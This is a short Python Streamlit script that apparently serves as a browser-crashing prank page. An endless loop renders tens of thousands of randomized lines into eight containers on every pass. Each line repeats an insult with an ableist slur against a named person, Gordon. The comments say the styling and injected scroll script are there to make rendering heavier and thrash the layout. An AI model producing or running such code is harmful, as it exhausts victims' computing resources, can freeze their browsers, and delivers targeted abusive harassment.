import streamlit as st
import random
import string

st.set_page_config(layout="wide")

# Fullscreen + heavier rendering styles
st.markdown("""
<style>
html, body, [data-testid="stAppViewContainer"] {
    margin: 0;
    padding: 0;
    overflow: hidden;
    background: black;
    color: lime;
    font-family: monospace;
}

/* Make rendering more expensive */
div {
    text-shadow: 0 0 5px lime;
    filter: blur(0.3px);
}
</style>
""", unsafe_allow_html=True)

# MORE containers = more simultaneous UI updates
containers = [st.empty() for _ in range(8)]

i = 0

while True:
    # Massive randomized payload (VERY heavy)
    spam = "<br>".join(
        f"{i+j} GORDON IS A RETARD {''.join(random.choices(string.ascii_letters + string.digits, k=20))}"
        for j in range(30000)
    )

    # Update every container every loop
    for c in containers:
        c.markdown(spam, unsafe_allow_html=True)

    # Force scroll + layout thrash
    st.markdown("""
    <script>
    window.scrollTo(0, document.body.scrollHeight);
    document.body.style.transform = "scale(1.0001)";
    </script>
    """, unsafe_allow_html=True)

    i += 30000
